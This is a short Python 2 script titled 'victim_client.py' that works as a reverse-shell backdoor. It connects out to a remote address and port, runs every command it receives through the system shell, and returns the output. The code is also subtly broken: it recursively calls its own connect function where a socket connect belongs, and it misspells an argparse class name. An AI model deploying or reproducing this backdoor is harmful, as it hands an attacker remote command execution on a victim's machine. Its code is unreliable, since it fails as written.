import subprocess
import socket
import argparse

# ------- Usage Function -------
def usage():
    print("\n")
    print("Examples:")
    print("victim_client.py -a 192.168.0.33 -p 9999")
# ------- End of Usage Function

# ------- Execute Command Function -------
def execute_command(cmd):
    cmd = cmd.rstrip()

    try:
        results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception, e:
        results = "Could not execute the command:" + cmd

    return results
# ------- End of Execute Command --------

# ------- Receive Function -------
def receive_data(client):

    try:
        while True:
            received_cmd = ""
            received_cmd += client.recv(4096) # Receive all the action commands from victim client

            if not received_cmd:
                continue
            cmd_results = execute_command(received_cmd)
            client.send(cmd_results)
    except Exception, e:
        print(str(e))
        pass
# ------- End of Receive Function -------

# ------- Client Connect Function -------
def client_connect(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_connect((host, port))
        print("Connected with the server " + host + " at port number " + str(port))
        receive_data(client)

    except Exception, e:
        print(str(e))
        client.close()
# ------- End of Client Connect --------

# ------- Main Function -------
def main():
    parser = argparse.ArgumentParse('Victim client commander')
    parser.add_argument("-a", "--address", type=str, help="This server IP address")
    parser.add_argument("-p", "--port", type=int, help="The port number to connect with", default=9999)
    args = parser.parse_args()

    if args.address == None:
        usage()

    target_host = args.address
    port_number = args.port
    client_connect(target_host, port_number)
# ------- End of Main ----------

# Application Entry Point -------
if __name__ == "__main__":
    main()

